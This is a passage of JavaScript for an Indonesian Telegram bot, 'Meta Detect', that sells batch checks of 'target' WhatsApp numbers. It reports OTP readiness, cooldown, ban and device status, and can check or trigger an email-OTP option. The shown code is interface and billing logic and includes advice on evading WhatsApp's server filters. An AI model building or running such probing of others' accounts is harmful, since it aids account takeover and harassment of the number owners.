    `▸ ᴜsᴇʀ ⦂ ${username}`,
    `▸ ɪᴅ ⦂ ${uid}`,
    `▸ ᴀᴋsᴇs ⦂ ${access}`,
    `▸ ᴋᴜᴏᴛᴀ ⦂ ${quota}`,
    `▸ ᴛᴏᴛᴀʟ ⦂ ${(u && u.total_detections) || 0} ᴅᴇᴛᴇᴋsɪ`,
    `▸ ʟᴇᴠᴇʟ ⦂ ${level}</blockquote>`,
    "",
    "ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴜʟᴀɪ ᴍᴇɴᴅᴇᴛᴇᴋsɪ, ᴍᴇᴍᴇʀɪᴋsᴀ ᴏᴘsɪ ᴇᴍᴀɪʟ, ᴀᴛᴀᴜ ᴍᴇʟɪʜᴀᴛ sᴛᴀᴛɪsᴛɪᴋ.",
    "",
    "◈ sɪsᴛᴇᴍ ᴀᴋᴛɪꜰ"
  ].join("\n");
}

async function buildDetectPrompt(userId, from = null) {
  const uid = Number(userId);
  await ensureUser(uid, from);
  const isOwner = ADMIN_IDS.includes(uid);
  const premium = await isPremiumUser(uid);
  const used = await getUsed(uid);
  const remaining = Math.max(0, FREE_DAILY_LIMIT - used);
  const accessBadge = isOwner ? "ᴏᴡɴᴇʀ" : (premium ? "ᴘʀᴇᴍɪᴜᴍ" : "ꜰʀᴇᴇ");
  const quotaText = (isOwner || premium)
    ? `ᴛᴀɴᴘᴀ ʙᴀᴛᴀs (${accessBadge})`
    : `ꜱɪꜱᴀ ${remaining} ᴅᴀʀɪ ${FREE_DAILY_LIMIT} ɴᴏᴍᴏʀ`;
  const limitText = (isOwner || premium)
    ? `ᴍᴀᴋsɪᴍᴀʟ ${PREMIUM_BATCH_LIMIT} ɴᴏᴍᴏʀ / ᴋɪʀɪᴍᴀɴ`
    : `ᴍᴀᴋsɪᴍᴀʟ ${remaining} ɴᴏᴍᴏʀ / ᴋɪʀɪᴍᴀɴ`;

  return [
    "⌖ ᴅᴇᴛᴇᴋsɪ ɴᴏᴍᴏʀ ᴡʜᴀᴛsᴀᴘᴘ",
    "",
    "ᴋɪʀɪᴍ ɴᴏᴍᴏʀ ᴛᴀʀɢᴇᴛ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴘᴇʀɪᴋsᴀ.",
    "· ᴘɪsᴀʜᴋᴀɴ ᴅᴇɴɢᴀɴ ʙᴀʀɪs ʙᴀʀᴜ ᴀᴛᴀᴜ ᴋᴏᴍᴀ",
    "· sɪsᴛᴇᴍ ᴏᴛᴏᴍᴀᴛɪs ᴍᴇɴɢᴇᴋsᴛʀᴀᴋ ᴀɴɢᴋᴀ",
    "",
    "<blockquote>ᴄᴏɴᴛᴏʜ ⦂",
    "+6281234567890",
    "+6281234567890 (Low) · Jul 2024</blockquote>",
    "",
    `▸ ᴋᴜᴏᴛᴀ ⦂ ${quotaText}`,
    `▸ ʟɪᴍɪᴛ ⦂ ${limitText}`,
    "",
    "ᴋʟɪᴋ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ."
  ].join("\n");
}

async function buildEmailPrompt(userId, from = null) {
  const uid = Number(userId);
  await ensureUser(uid, from);
  const isOwner = ADMIN_IDS.includes(uid);
  const premium = await isPremiumUser(uid);
  const used = await getUsed(uid);
  const remaining = Math.max(0, FREE_DAILY_LIMIT - used);
  const quotaText = (isOwner || premium) ? "ᴜɴʟɪᴍɪᴛᴇᴅ" : `${remaining}/${FREE_DAILY_LIMIT}`;
  const batchMax = (isOwner || premium) ? PREMIUM_BATCH_LIMIT : remaining;

  return [
    "❖ ᴄᴇᴋ & ᴘɪᴄᴜ ᴏᴘꜱɪ ᴇᴍᴀɪʟ ᴏᴛᴘ",
    "ᴋʜᴜꜱᴜꜱ ɴᴏᴍᴏʀ ʏᴀɴɢ ꜱᴜᴅᴀʜ ᴛᴇʀᴛᴀᴜᴛ ᴀʟᴀᴍᴀᴛ ᴇᴍᴀɪʟ",
    "",
    "<blockquote>⚙ ᴘᴀɴᴅᴜᴀɴ ɪɴᴘᴜᴛ",
    "1. ᴋɪʀɪᴍ ɴᴏᴍᴏʀ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴘᴇʀɪᴋsᴀ ᴏᴘsɪ ᴇᴍᴀɪʟɴʏᴀ.",
    "2. ʙɪꜱᴀ 1 ɴᴏᴍᴏʀ ᴀᴛᴀᴜ ʙᴀɴʏᴀᴋ ɴᴏᴍᴏʀ ꜱᴇᴋᴀʟɪɢᴜꜱ.",
    "3. ꜰᴏʀᴍᴀᴛ ɴᴏᴍᴏʀ ⦂ <code>+6281234567890</code></blockquote>",
    "",
    `◈ ꜱɪꜱᴀ ᴋᴜᴏᴛᴀ ⦂ ${quotaText} · ᴍᴀᴋꜱ ${batchMax} ɴᴏᴍᴏʀ`,
    "⟢ ꜱɪʟᴀᴋᴀɴ ᴋɪʀɪᴍ ɴᴏᴍᴏʀ ᴛᴀʀɢᴇᴛ ꜱᴇᴋᴀʀᴀɴɢ."
  ].join("\n");
}

function buildEmailGuidePage() {
  return [
    "ⓘ ᴘᴀɴᴅᴜᴀɴ ᴠᴇʀɪꜰɪᴋᴀꜱɪ ᴇᴍᴀɪʟ",
    "ᴋᴇᴛᴇʀᴀɴɢᴀɴ ꜱᴛᴀᴛᴜꜱ & ᴄᴀʀᴀ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ᴏᴘꜱɪ ᴇᴍᴀɪʟ",
    "",
    "<blockquote>✦ ᴏᴘꜱɪ ᴇᴍᴀɪʟ ᴛᴇʀꜱᴇᴅɪᴀ",
    "ꜱᴇʀᴠᴇʀ ᴍᴇɴɢᴏɴꜰɪʀᴍᴀꜱɪ ᴏᴘꜱɪ ᴏᴛᴘ ᴇᴍᴀɪʟ ᴀᴋᴛɪꜰ ᴘᴀᴅᴀ ɴᴏᴍᴏʀ ᴛᴇʀꜱᴇʙᴜᴛ.",
    "",
    "◐ ᴊᴇᴅᴀ ᴏᴛᴘ ᴇᴍᴀɪʟ",
    "ᴘᴇʀᴍɪɴᴛᴀᴀɴ ᴋᴏᴅᴇ ᴇᴍᴀɪʟ ꜱᴇᴅᴀɴɢ ᴅɪʙᴀᴛᴀꜱɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ.",
    "",
    "○ ᴏᴘꜱɪ ᴇᴍᴀɪʟ ʙᴇʟᴜᴍ ᴍᴜɴᴄᴜʟ",
    "ꜱᴇʀᴠᴇʀ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴇʟᴜᴍ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴘꜱɪ ᴇᴍᴀɪʟ ᴜɴᴛᴜᴋ ꜱᴇꜱɪ ɪɴɪ.</blockquote>",
    "",
    "<blockquote>⚙ ᴄᴀʀᴀ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ᴅɪ ᴀᴘʟɪᴋᴀꜱɪ",
    "1. ɢᴜɴᴀᴋᴀɴ ᴡʜᴀᴛꜱᴀᴘᴘ ʀᴇꜱᴍɪ & ᴊᴀʀɪɴɢᴀɴ ɪɴᴛᴇʀɴᴇᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ꜱᴀᴀᴛ ᴍᴇɴᴀᴜᴛᴋᴀɴ ᴇᴍᴀɪʟ.",
    "2. ʜɪɴᴅᴀʀɪ ᴍᴇɴɢᴇᴄᴇᴋ ɴᴏᴍᴏʀ ʙᴇʀᴜʟᴀɴɢ-ᴜʟᴀɴɢ ᴀɢᴀʀ ᴛɪᴅᴀᴋ ᴛᴇʀᴋᴇɴᴀ ꜰɪʟᴛᴇʀ ꜱᴇʀᴠᴇʀ.",
    "3. ᴊɪᴋᴀ ᴛᴇʀᴋᴇɴᴀ ᴊᴇᴅᴀ, ᴛᴜɴɢɢᴜ ʜɪɴɢɢᴀ ᴡᴀᴋᴛᴜ ᴛᴜɴɢɢᴜ ꜱᴇʟᴇꜱᴀɪ ʟᴀʟᴜ ᴄᴏʙᴀ ʟᴀɢɪ ᴅɪ ᴡᴀ ʀᴇꜱᴍɪ.</blockquote>"
  ].join("\n");
}

function buildDetectInfoPage() {
  return [
    "ⓘ ɪɴꜰᴏʀᴍᴀꜱɪ ʜᴀꜱɪʟ ᴅᴇᴛᴇᴋꜱɪ",
    "ᴘᴀɴᴅᴜᴀɴ ꜱᴛᴀᴛᴜꜱ ɴᴏᴍᴏʀ & ᴘᴇʀᴀɴɢᴋᴀᴛ ᴡʜᴀᴛꜱᴀᴘᴘ",
    "",
    "<blockquote>✧ ꜱɪᴀᴘ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ",
    "ɴᴏᴍᴏʀ ʙᴇʀꜱɪʜ ᴅᴀɴ ꜱɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴏᴅᴇ ᴏᴛᴘ ᴠᴇʀɪꜰɪᴋᴀꜱɪ.",
    "",
    "◐ ᴄᴏᴏʟᴅᴏᴡɴ ᴡʜᴀᴛꜱᴀᴘᴘ",
    "ᴘᴇʀᴍɪɴᴛᴀᴀɴ ᴏᴛᴘ ᴅɪʙᴀᴛᴀꜱɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ ꜱᴇꜱᴜᴀɪ ᴅᴜʀᴀꜱɪ ᴡᴀᴋᴛᴜ.",
    "",
    "△ ᴛɪᴅᴀᴋ ꜱᴜᴘᴘᴏʀᴛ ᴄʟᴏɴᴇ",
    "ɴᴏᴍᴏʀ ᴅɪʙᴀᴛᴀꜱɪ ᴜɴᴛᴜᴋ ᴀᴘʟɪᴋᴀꜱɪ ᴄʟᴏɴᴇ / ᴍᴏᴅɪꜰɪᴋᴀꜱɪ.",
    "",
    "✕ ᴅɪʙᴀᴛᴀꜱɪ (ʙᴀɴɴᴇᴅ)",
    "ɴᴏᴍᴏʀ ᴅᴀʟᴀᴍ ꜱᴛᴀᴛᴜꜱ ᴅɪʙʟᴏᴋɪʀ ᴅᴀʀɪ ʟᴀʏᴀɴᴀɴ ᴡʜᴀᴛꜱᴀᴘᴘ.</blockquote>",
    "",
    "<blockquote>● ᴏɴ-ᴅᴇᴠɪᴄᴇ (ᴡᴀ_ᴏʟᴅ)",
    "ɴᴏᴍᴏʀ ᴛᴇʀᴅᴀꜰᴛᴀʀ & ᴀᴋᴛɪꜰ ʟᴏɢɪɴ ᴘᴀᴅᴀ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴡʜᴀᴛꜱᴀᴘᴘ.",
    "",
    "○ ᴏꜰꜰ-ᴅᴇᴠɪᴄᴇ",
    "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ᴀᴋᴛɪꜰ ʏᴀɴɢ ᴛᴇʀᴅᴀꜰᴛᴀʀ.</blockquote>"
  ].join("\n");
}

async function buildStatusPage(userId, from = null) {
  const uid = Number(userId);
  const u = from ? await ensureUser(uid, from) : await getUser(uid);
  const isOwner = ADMIN_IDS.includes(uid);
  const premium = await isPremiumUser(uid);
  const access = isOwner ? "ᴏᴡɴᴇʀ ᴀᴄᴄᴇss" : (premium ? "ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss" : "ꜰʀᴇᴇ ᴀᴄᴄᴇss");
  const quota = (isOwner || premium) ? "ᴛᴀɴᴘᴀ ʙᴀᴛᴀꜱ" : `${Math.max(0, FREE_DAILY_LIMIT - await getUsed(uid))} / ${FREE_DAILY_LIMIT}`;
  const activeDate = isOwner ? "ᴘᴇʀᴍᴀɴᴇɴᴛ" : (premium && u && u.premium_until ? formatWIB(u.premium_until) : formatWIB(u && u.created_at));
  const ref = await getReferralStats(uid);
  const liveName = from ? [from.first_name, from.last_name].filter(Boolean).join(" ").trim() : "";
  const rawUser = cleanUsername(from && from.username) || cleanUsername(u && u.username);
  return [
    "◈ ʀɪɴɢᴋᴀꜱᴀɴ ꜱᴛᴀᴛᴜꜱ ᴀᴋᴜɴ",
    "ɪɴꜰᴏʀᴍᴀꜱɪ ᴋᴇᴀɴɢɢᴏᴛᴀᴀɴ & ᴀᴋᴛɪᴠɪᴛᴀꜱ",
    "",
    `<blockquote>⚙ ᴘʀᴏꜰɪʟ ᴀᴋᴜɴ`,
    `▸ ɴᴀᴍᴀ ⦂ ${esc(liveName || (u && u.first_name) || "ᴛᴀɴᴘᴀ ɴᴀᴍᴀ")}`,
    `▸ ᴜsᴇʀ ⦂ ${rawUser ? "@" + esc(rawUser) : "-"}`,
    `▸ ɪᴅ ⦂ ${uid}`,
    `▸ ᴀᴋꜱᴇꜱ ⦂ ${access}`,
    `▸ ᴋᴜᴏᴛᴀ ⦂ ${quota}`,
    `▸ ᴛᴏᴛᴀʟ ᴅᴇᴛᴇᴋꜱɪ ⦂ ${(u && u.total_detections) || 0} ɴᴏᴍᴏʀ`,
    `▸ ᴄᴇᴋ ᴇᴍᴀɪʟ ⦂ ${(u && u.email_triggers) || 0} ɴᴏᴍᴏʀ`,
    `▸ ᴍᴀꜱᴀ ᴀᴋᴛɪꜰ ⦂ ${activeDate}</blockquote>`,
    "",
    `<blockquote>❖ ᴘʀᴏɢʀᴀᴍ ʀᴇꜰᴇʀᴀʟ`,
    `▸ ᴛᴇᴍᴀɴ ʙᴇʀɢᴀʙᴜɴɢ ⦂ ${ref.joined}`,
    `▸ ᴘᴏɪɴ ᴛᴇʀᴋᴜᴍᴘᴜʟ ⦂ ${ref.points}`,
    `▸ ʜᴀᴅɪᴀʜ ᴅɪᴛᴇʀɪᴍᴀ ⦂ ${ref.redeemedDays} ʜᴀʀɪ ᴘʀᴇᴍɪᴜᴍ</blockquote>`,
    "",
    "◈ ꜱɪꜱᴛᴇᴍ ᴀᴋᴛɪꜰ"
  ].join("\n");
}

function buildPremiumPage() {
  const planLines = [];
  for (let i = 0; i < PLANS.length; i++) {
    const p = PLANS[i];
    const perDay = Math.round(p.price / p.days);
    planLines.push(`${p.icon} ${p.days} ʜᴀʀɪ — ${formatRp(p.price)} · ${p.badge}`);
    planLines.push(`   ꜱᴇᴛᴀʀᴀ ${formatRp(perDay)} / ʜᴀʀɪ`);
    if (i < PLANS.length - 1) planLines.push("");
  }
  return [
    "♛ ᴍᴇᴛᴀ ᴅᴇᴛᴇᴄᴛ ᴘʀᴇᴍɪᴜᴍ",
    "ᴀᴋꜱᴇꜱ ᴘʀᴇᴍɪᴜᴍ ᴜɴᴛᴜᴋ ᴘᴇɴɢɢᴜɴᴀᴀɴ ʟᴇʙɪʜ ʟᴇʟᴜᴀꜱᴀ.",
    "",
    "✦ ᴋᴇᴜɴɢɢᴜʟᴀɴ ᴘʀᴇᴍɪᴜᴍ",
    "· ᴋᴜᴏᴛᴀ ᴘᴇᴍᴇʀɪᴋꜱᴀᴀɴ ᴛᴀɴᴘᴀ ʙᴀᴛᴀꜱ ʜᴀʀɪᴀɴ",
    "· ʙᴀᴛᴄʜ ʜɪɴɢɢᴀ 30 ɴᴏᴍᴏʀ ᴅᴀʟᴀᴍ ꜱᴀᴛᴜ ᴋɪʀɪᴍᴀɴ",
    "· ᴘʀɪᴏʀɪᴛᴀꜱ ᴀᴋꜱᴇꜱ ꜰɪᴛᴜʀ ꜱᴇʟᴀᴍᴀ ᴍᴀꜱᴀ ᴀᴋᴛɪꜰ",
    "",
    `<blockquote>${planLines.join("\n")}</blockquote>`,
    "",
    "ᴘɪʟɪʜ ᴘᴀᴋᴇᴛ ᴍᴇʟᴀʟᴜɪ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ."
  ].join("\n");
}

function buildPremiumKeyboard() {
  return inlineKb([
    [
      btn(`${PLANS[0].icon} ${PLANS[0].days} ʜᴀʀɪ · ${formatRp(PLANS[0].price)}`, `buy_${PLANS[0].id}`, PLANS[0].style),
      btn(`${PLANS[1].icon} ${PLANS[1].days} ʜᴀʀɪ · ${formatRp(PLANS[1].price)}`, `buy_${PLANS[1].id}`, PLANS[1].style)
    ],
    [
      btn(`${PLANS[2].icon} ${PLANS[2].days} ʜᴀʀɪ · ${formatRp(PLANS[2].price)}`, `buy_${PLANS[2].id}`, PLANS[2].style),
      btn(`${PLANS[3].icon} ${PLANS[3].days} ʜᴀʀɪ · ${formatRp(PLANS[3].price)}`, `buy_${PLANS[3].id}`, PLANS[3].style)
    ],
    [
      btn(`${PLANS[4].icon} ${PLANS[4].days} ʜᴀʀɪ · ${formatRp(PLANS[4].price)}`, `buy_${PLANS[4].id}`, PLANS[4].style)
    ]
  ]);
}

async function buildReferralPage(userId) {
  const ref = await getReferralStats(userId);
  const link = `https://t.me/${BOT_USERNAME}?start=ref_${userId}`;
  return [
    "⌬ ᴘʀᴏɢʀᴀᴍ ʀᴇꜰᴇʀᴀʟ",
    "",
    "◈ ᴜɴᴅᴀɴɢ ᴛᴇᴍᴀɴ & ᴅᴀᴘᴀᴛᴋᴀɴ ᴘᴏɪɴ",
    "  ⊹ 1 ᴛᴇᴍᴀɴ ᴀᴋᴛɪꜰ ⦂ +1 ᴘᴏɪɴ",
    "  ⊹ ᴛᴜᴋᴀʀ ᴘᴏɪɴ ᴍᴇɴᴊᴀᴅɪ ᴘʀᴇᴍɪᴜᴍ",
    "",
    `<blockquote>⟐ sᴛᴀᴛɪsᴛɪᴋ ᴀɴᴅᴀ`,
    `  ▸ ᴛᴇᴍᴀɴ ʙᴇʀɢᴀʙᴜɴɢ ⦂ ${ref.joined}`,
    `  ▸ ᴘᴏɪɴ ᴛᴇʀᴋᴜᴍᴘᴜʟ ⦂ ${ref.points}`,
    `  ▸ ʜᴀᴅɪᴀʜ ᴅɪᴛᴇʀɪᴍᴀ ⦂ ${ref.redeemedDays} ʜᴀʀɪ ᴘʀᴇᴍɪᴜᴍ</blockquote>`,
    "",
    "⌲ ʟɪɴᴋ ʀᴇꜰᴇʀᴀʟ",
    `<blockquote><code>${esc(link)}</code></blockquote>`
  ].join("\n");
}

function buildReferralKeyboard(userId) {
  const link = `https://t.me/${BOT_USERNAME}?start=ref_${userId}`;
  const shareText = "✦ META DETECT — Cek status nomor WhatsApp secara real-time!";
  const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(shareText)}`;
  return inlineKb([
    [
      btn("❖ ᴛᴜᴋᴀʀ ᴘᴏɪɴ", "rewards", "success"),
      urlBtn("⌲ ʙᴀɢɪᴋᴀɴ ᴛᴀᴜᴛᴀɴ", shareUrl, "primary")
    ]
  ]);
}

async function buildRewardsPage(userId) {
  const ref = await getReferralStats(userId);
  const rewardLines = REWARDS.map(r => {
    const ok = ref.points >= r.pts;
    return `${ok ? "✦" : "○"} ${r.pts} ᴘᴛ → ${r.days} ʜᴀʀɪ ᴘʀᴇᴍɪᴜᴍ`;
  });
  return [
    "❖ ᴛᴜᴋᴀʀ ᴘᴏɪɴ ʀᴇꜰᴇʀᴀʟ",
    "",
    `⟐ ᴘᴏɪɴ ᴀɴᴅᴀ ⦂ ${ref.points} ᴘᴛ`,
    "",
    `<blockquote>${rewardLines.join("\n")}</blockquote>`,
    "",
    "ᴘɪʟɪʜ ᴘᴀᴋᴇᴛ ᴘᴇɴᴜᴋᴀʀᴀɴ ᴅɪ ʙᴀᴡᴀʜ."
  ].join("\n");
}

function buildRewardsKeyboard(points) {
  const st = (pts) => (points >= pts ? "success" : "primary");
  const mk = (pts) => (points >= pts ? " ✓" : "");
  return inlineKb([
    [
      btn(`${REWARDS[0].pts} ᴘᴛ → ${REWARDS[0].days} ʜᴀʀɪ${mk(REWARDS[0].pts)}`, "redeem_0", st(REWARDS[0].pts)),
      btn(`${REWARDS[1].pts} ᴘᴛ → ${REWARDS[1].days} ʜᴀʀɪ${mk(REWARDS[1].pts)}`, "redeem_1", st(REWARDS[1].pts))
    ],
    [
      btn(`${REWARDS[2].pts} ᴘᴛ → ${REWARDS[2].days} ʜᴀʀɪ${mk(REWARDS[2].pts)}`, "redeem_2", st(REWARDS[2].pts)),
      btn(`${REWARDS[3].pts} ᴘᴛ → ${REWARDS[3].days} ʜᴀʀɪ${mk(REWARDS[3].pts)}`, "redeem_3", st(REWARDS[3].pts))
    ],
    [
      btn(`${REWARDS[4].pts} ᴘᴛ → ${REWARDS[4].days} ʜᴀʀɪ${mk(REWARDS[4].pts)}`, "redeem_4", st(REWARDS[4].pts))
    ],
    [
      btn("⟢ ᴋᴇᴍʙᴀʟɪ", "referral", "danger")
    ]
  ]);
}

async function buildLeaderboardPage(userId) {
  const rows = await getLeaderboard();
  const my = await getUser(userId);
  const myScore = (my && my.ready_detections) || 0;
  const rankLines = [];
  if (rows.length === 0) {
    rankLines.push("⟡ ʙᴇʟᴜᴍ ᴀᴅᴀ ᴅᴀᴛᴀ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ");
  } else {
    rows.forEach((r, i) => {
      const rank = String(i + 1).padStart(2, " ");
      const tag = r.user_id === userId ? " ◂ ᴀɴᴅᴀ" : "";
      rankLines.push(`⟢ #${rank} ${esc(r.name)} ⦂ ${r.score} ʀᴇᴀᴅʏ${tag}`);
    });
  }
  return [
    "♛ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ ᴛᴏᴘ 10",
    "ᴘᴇɴɢɢᴜɴᴀ ᴅᴇɴɢᴀɴ ꜱᴛᴀᴛᴜꜱ ꜱɪᴀᴘ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ ᴛᴇʀʙᴀɴʏᴀᴋ",
    "",
    `<blockquote>${rankLines.join("\n")}</blockquote>`,
    "",
    "⚙ ꜱᴛᴀᴛɪꜱᴛɪᴋ ᴀɴᴅᴀ",
    `▸ ʀᴇᴀᴅʏ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ ⦂ ${myScore}`
  ].join("\n");
}

async function buildPaymentInvoice(userId, plan, inv) {
  const paymentInfo = await getSetting("payment_info", process.env.PAYMENT_INFO || "ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ᴜɴᴛᴜᴋ ɪɴꜰᴏ ᴘᴇᴍʙᴀʏᴀʀᴀɴ");
  const contact = await getSetting("admin_contact", process.env.ADMIN_CONTACT || "@admin");
  return [
    "✦ ᴅᴇᴛᴀɪʟ ᴛᴀɢɪʜᴀɴ",
    "",
    `<blockquote>⟡ ɪɴᴠᴏɪᴄᴇ ⦂ <code>${esc(inv)}</code>`,
    `⊹ ᴘᴀᴋᴇᴛ ⦂ ${plan.days} ʜᴀʀɪ · ${plan.badge}`,
    `⊹ ʜᴀʀɢᴀ ⦂ ${formatRp(plan.price)}</blockquote>`,
    "",
    "⚙ ɪɴꜱᴛʀᴜᴋꜱɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ",
    `<blockquote>${esc(paymentInfo)}</blockquote>`,
    "",
    "⟢ ᴋɪʀɪᴍ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ (ꜰᴏᴛᴏ) ᴋᴇ ʙᴏᴛ ɪɴɪ",
    `⊹ ᴋᴏɴᴛᴀᴋ ᴀᴅᴍɪɴ ⦂ ${esc(contact)}`
  ].join("\n");
}

async function buildAdminPanel(userId) {
  if (!ADMIN_IDS.includes(Number(userId))) return null;
  const allIds = await getAllUserIds();
  let activePremCount = 0;
  let totalDetectionsAll = 0;
  let totalReadyAll = 0;
  let totalEmailAll = 0;
  const now = Date.now();
  for (const uid of allIds) {
    const u = await getUser(Number(uid));
    if (!u) continue;
    totalDetectionsAll += u.total_detections || 0;
    totalReadyAll += u.ready_detections || 0;
    totalEmailAll += u.email_triggers || 0;
    if (u.premium_until && new Date(u.premium_until).getTime() > now) {
      activePremCount++;
    }
  }
  const pending = Number(await redis.scard("payments:pending")) || 0;
  return [
    "⚙ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ",
    "ᴘᴜꜱᴀᴛ ᴋᴏɴᴛʀᴏʟ & ᴍᴀɴᴀᴊᴇᴍᴇɴ ʙᴏᴛ",
    "",
    `<blockquote>⟐ ꜱᴛᴀᴛɪꜱᴛɪᴋ ꜱɪꜱᴛᴇᴍ`,
    `  ▸ ᴛᴏᴛᴀʟ ᴜꜱᴇʀ ⦂ ${allIds.length} ᴘᴇɴɢɢᴜɴᴀ`,
    `  ▸ ᴜꜱᴇʀ ᴘʀᴇᴍɪᴜᴍ ⦂ ${activePremCount} ᴀᴋᴛɪꜰ`,
    `  ▸ ᴛᴀɢɪʜᴀɴ ᴘᴇɴᴅɪɴɢ ⦂ ${pending} ɪɴᴠᴏɪᴄᴇ`,
    `  ▸ ᴛᴏᴛᴀʟ ᴅᴇᴛᴇᴋꜱɪ ⦂ ${totalDetectionsAll} ɴᴏᴍᴏʀ`,
    `  ▸ ᴛᴏᴛᴀʟ ʀᴇᴀᴅʏ ⦂ ${totalReadyAll} ɴᴏᴍᴏʀ`,
    `  ▸ ᴄᴇᴋ ᴇᴍᴀɪʟ ⦂ ${totalEmailAll} ɴᴏᴍᴏʀ</blockquote>`,
    "",
    "ᴘɪʟɪʜ ᴍᴇɴᴜ ᴘᴇɴɢᴀᴛᴜʀᴀɴ ᴅɪ ʙᴀᴡᴀʜ."
  ].join("\n");
}

function buildAdminKeyboard() {
  return inlineKb([
    [
      btn("⟡ ᴛᴀɢɪʜᴀɴ ᴘᴇɴᴅɪɴɢ", "adm_pay", "primary"),
      btn("⌲ ʙʀᴏᴀᴅᴄᴀꜱᴛ", "adm_bc", "primary")
    ],
    [
      btn("✦ ᴀᴅᴅ ᴘʀᴇᴍɪᴜᴍ", "adm_addprem", "success"),
      btn("✕ ᴅᴇʟ ᴘʀᴇᴍɪᴜᴍ", "adm_delprem", "danger")
    ],
    [
      btn("♛ ʟɪꜱᴛ ᴘʀᴇᴍɪᴜᴍ", "adm_premlist", "primary"),
      btn("⊹ ɪɴꜰᴏ ᴘᴀʏᴍᴇɴᴛ", "adm_setpay", "primary")
    ],
    [
      btn("⊹ ᴋᴏɴᴛᴀᴋ ᴀᴅᴍɪɴ", "adm_setcontact", "primary"),
      btn("✕ ᴛᴜᴛᴜᴘ ᴘᴀɴᴇʟ", "adm_close", "danger")
    ]
  ]);
}

function splitBlocksIntoChunks(blocks, maxLen = 3800) {
  const chunks = [];
  let cur = "";
  for (const block of blocks) {
    if (!cur) {
      cur = block;
    } else if ((cur + "\n\n" + block).length > maxLen) {
      chunks.push(cur);
      cur = block;
    } else {
      cur += "\n\n" + block;
    }
  }
  if (cur) chunks.push(cur);
  return chunks;
}

function summarizeProgress(results, total) {
  let ready = 0, cooldown = 0, inUse = 0, clone = 0, banned = 0, failed = 0, done = 0;
  let devOn = 0, devOff = 0;
  for (const r of results) {
    if (!r) continue;
    done++;
    if (!r.success) { failed++; continue; }
    const st = r.state || "UNKNOWN";
    if (st === "ERROR" || st === "INVALID_NUMBER" || st === "UNKNOWN") { failed++; continue; }
    if (isDeviceOn(r)) devOn++;
    else devOff++;
    if (r.isBanned || st === "BANNED") { banned++; continue; }
    if (r.isCloneBlocked || st === "CLONE_BLOCKED") { clone++; continue; }
    if (r.isInUse || st === "IN_USE") { inUse++; continue; }
    if (r.isCooldown || r.isSmsLimited || st === "COOLDOWN" || st === "SMS_LIMIT" || Number(r.cooldownSeconds || 0) > 0) {
      cooldown++;
      continue;
    }
    if (r.isReady || st === "READY") { ready++; continue; }
    failed++;
  }
  const pct = total > 0 ? Math.round(done * 100 / total) : 0;
  const lines = [
    "✦ ᴘᴇᴍᴇʀɪᴋꜱᴀᴀɴ ʙᴇʀᴊᴀʟᴀɴ",
    "",
    `<blockquote>◈ ${bar(pct)} ${pct}%`,
    `⟡ ᴘʀᴏɢʀᴇꜱ ⦂ ${done} / ${total} ɴᴏᴍᴏʀ`,
    "",
    `✧ ꜱɪᴀᴘ ⦂ ${ready}`,
    `◐ ᴄᴏᴏʟᴅᴏᴡɴ ⦂ ${cooldown}`,
    `↻ ꜱᴇᴅᴀɴɢ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ ⦂ ${inUse}`,
    `△ ᴄʟᴏɴᴇ ⦂ ${clone}`,
    `✕ ʙᴀɴɴᴇᴅ ⦂ ${banned}`,
    "",
    `● ᴏɴ-ᴅᴇᴠɪᴄᴇ ⦂ ${devOn}`,
    `○ ᴏꜰꜰ-ᴅᴇᴠɪᴄᴇ ⦂ ${devOff}`
  ];
  if (failed > 0) lines.push(`⚠ ɢᴀɢᴀʟ ⦂ ${failed}`);
  lines[lines.length - 1] += "</blockquote>";
  return lines.join("\n");
}

function summarizeEmailProgress(results, total) {
  let eligible = 0, unavailable = 0, done = 0;
  for (const r of results) {
    if (!r) continue;
    done++;
    if (!r.success || r.emailStatus === "BANNED") { unavailable++; continue; }
    if (r.emailStatus === "ELIGIBLE") {
      eligible++;
    } else {
      unavailable++;
    }
  }
  const pct = total > 0 ? Math.round(done * 100 / total) : 0;
  return [
    "✦ ᴄᴇᴋ ᴇᴍᴀɪʟ",
    "",
    `<blockquote>◈ ${bar(pct)} ${pct}%`,
    `▸ ${done} / ${total}`,
    `✦ ꜱᴜᴅᴀʜ ⦂ ${eligible} · ○ ʙᴇʟᴜᴍ ⦂ ${unavailable}</blockquote>`
  ].join("\n");
}

function buildDetectionOutput(numbers, results, elapsedSec = null) {
  const ready = [];
  const cooldown = [];
  const inUse = [];
  const clone = [];
  const banned = [];
  const errors = [];
  let devOn = 0;
  let devOff = 0;

  results.forEach((r, i) => {
    const fb = numbers[i];
    if (!r) {
      errors.push({ phone: fb, error: "ɴᴏ ʀᴇꜱᴘᴏɴꜱᴇ" });
      return;
    }
    if (!r.success) {
